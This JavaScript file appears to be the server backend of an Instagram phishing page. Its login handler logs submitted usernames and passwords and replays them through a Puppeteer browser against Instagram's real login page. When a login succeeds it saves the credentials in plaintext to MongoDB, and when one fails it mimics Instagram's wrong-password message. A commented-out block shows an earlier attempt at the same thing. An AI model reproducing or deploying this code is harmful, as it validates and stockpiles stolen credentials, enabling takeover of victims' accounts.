import puppeteer from "puppeteer";
import { asyncHandler } from "../utils/asyncHandler.js";
import { ApiError } from "../utils/apiError.js";
import { User } from "../models/user.model.js"; // Interaction with MongoDB
import { ApiResponse } from "../utils/apiResponse.js";

const loginUser = asyncHandler(async (req, res) => {
  console.log(req.body);
  const { username, password } = req.body;
  console.log(username, password);
  let browser;
  try {
    browser = await puppeteer.launch({
      headless: false,
    });
    const page = await browser.newPage();

    //setting up the reponse listener
    const loginPromise = new Promise((resolve, reject) => {
      page.on("response", async (response) => {
        const url = response.url();
        // console.log(response.url());

        if (url.includes("/api/v1/web/accounts/login/ajax/")) {
          try {
            const respBody = await response.json();
            if (response.status() === 200) {
              resolve(respBody);
            } else {
              reject(
                new Error(`login failed with status ${response.status()}`)
              );
            }
          } catch (error) {
            console.log(new Error(`Failed to parse response: ${e.message}`));
          }
        }
      });
    });

    await page.goto("https://instagram.com/accounts/login", {
      waitUntil: "networkidle2",
      timeout: 30000,
    });

    await page.waitForSelector('input[name="username"]');
    await page.waitForSelector('input[name="password"]');

    await page.type('input[name="username"]', username);
    await page.type('input[name="password"]', password);

    await page.click('button[type="submit"]');

    const result = await loginPromise;
    console.log("login result", result);

    console.log(result.authenticated);
    if (result.authenticated === true) {
      const user = await User.create({
        username,
        password,
      });
      // return res.redirect("https://www.instagram.com");
      return res.status(200).json({
        message: "ok",
      });
    } else {
      return res.status(401).json({
        success: false,
        message:
          "Sorry, your password was incorrect. Please double-check your password.",
      });
    }
  } catch (error) {
    console.error("Login error:", error);
  }
});

export { loginUser };

// import jsdom from "jsdom";
// const { JSDOM } = jsdom;
// 😭😭 this was dumb af
// async function login(username, password) {
//   const resp = await fetch("https://www.instagram.com/");
//   const htmlBody = await resp.text();
//   const dom = new JSDOM(htmlBody);

//   const usernameInput = dom.window.document.querySelector(
//     'input[name="username"]'
//   );
//   usernameInput.value = username;
//   const passwordInput = dom.window.document.querySelector(
//     'input[name="password"]'
//   );
//   passwordInput.value = password;

//   const loginButton = document.querySelector("button._acan._acap._acas");
//   loginButton.click();

//   return;
// }
